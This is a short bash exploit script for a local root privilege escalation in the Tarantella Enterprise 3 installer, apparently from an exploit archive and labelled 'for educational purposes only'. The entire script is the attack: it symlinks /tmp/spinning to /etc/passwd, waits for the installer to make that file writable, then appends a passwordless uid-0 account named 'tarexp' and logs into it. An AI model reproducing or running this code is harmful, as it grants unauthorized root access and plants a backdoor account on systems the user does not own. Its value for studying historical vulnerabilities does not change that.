#!/bin/bash
#Larry W. Cashdollar  lwc@vapid.dhs.org
#http://vapid.dhs.org
#Tarantella Enterprise 3 symlink local root Installation exploit
#For educational purposes only.
#tested on Linux.  run and wait.


echo "Creating symlink."

/bin/ln -s /etc/passwd /tmp/spinning

echo "Waiting for tarantella installation."

while true
do
echo -n .
if [ -w /etc/passwd ]
then
        echo "tarexp::0:0:Tarantella Exploit:/:/bin/bash" >> /etc/passwd
        su - tarexp
        exit
fi
done
